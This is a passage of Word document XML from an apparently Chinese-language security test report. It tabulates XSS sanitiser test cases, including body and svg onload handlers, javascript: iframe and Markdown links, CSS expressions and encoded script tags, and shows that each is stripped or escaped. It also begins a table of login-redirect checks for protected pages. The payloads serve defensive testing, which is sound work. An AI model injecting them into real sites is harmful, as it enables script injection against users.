          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>事件处理器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;body onload=alert(1)&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>删除 body</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SVG 向量</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;svg onload=alert(1)&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>删除 svg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>iframe 嵌套</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;iframe src=javascript:alert(1)&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>删除 iframe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CSS 表达式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;div style="expression:alert(1)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>清理 style</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>编码 script</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>默认转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Markdown 注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>[click](javascript:alert(1))</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>不解析为 HTML</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>正常标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;h2&gt;标题&lt;/h2&gt;&lt;p&gt;段落&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>保留</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>表格标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;table&gt;&lt;tr&gt;&lt;td&gt;数据&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>保留</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>超链接</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;a href="https://example.com"&gt;链接&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>保留 href</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>7.4 认证与授权边界测试</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>未登录访问 /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无 Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>重定向 /login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>未登录访问 /upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无 Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>重定向 /login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>未登录访问 /profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无 Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>重定向 /login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>未登录访问 /recharge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无 Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>重定向 /login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
